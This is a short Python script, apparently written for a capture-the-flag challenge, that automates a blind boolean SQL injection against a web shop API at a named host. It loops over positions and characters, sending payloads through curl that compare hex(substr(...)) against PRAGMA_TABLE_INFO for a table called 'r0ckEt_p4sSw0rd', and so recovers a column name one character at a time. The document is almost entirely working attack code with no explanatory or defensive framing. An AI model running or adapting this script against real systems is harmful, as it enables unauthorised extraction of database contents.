import os
import urllib.parse
import json
import subprocess
import time
chars   = [chr(x) for x in range(32,255)]
counter = ""
for i in range (1,9,1):
    for ch in chars:
        d = str(ch)
        variable = f"1' and (SELECT hex(substr(name, {i}, 1)) FROM PRAGMA_TABLE_INFO('r0ckEt_p4sSw0rd')) = hex('{d}') --"
        aa = str(variable)
        encoded_variable = urllib.parse.quote_plus(variable)
        output = subprocess.check_output(["curl", "-X", "POST","-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8", "-H", "Origin: http://docean.shoxxdj.fr:1001", "-H", "Connection: close", "-H", "Referer: http://docean.shoxxdj.fr:1001/game", "-H", "X-Requested-With: XMLHttpRequest","-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36" ,"-b", "myApp=YOURCOOKIE", "http://docean.shoxxdj.fr:1001/api/html/shop", "-d", f"ellement={aa}"], text=True)
        print(f"{i}: {ch}")
        print(output)
        if (output[10] == "0"):
            print(f"Character {ch} found at {i} position")
            counter = counter + ch
            print(f"Counter: {counter}")
            break
        # time.sleep(3)

print(counter)
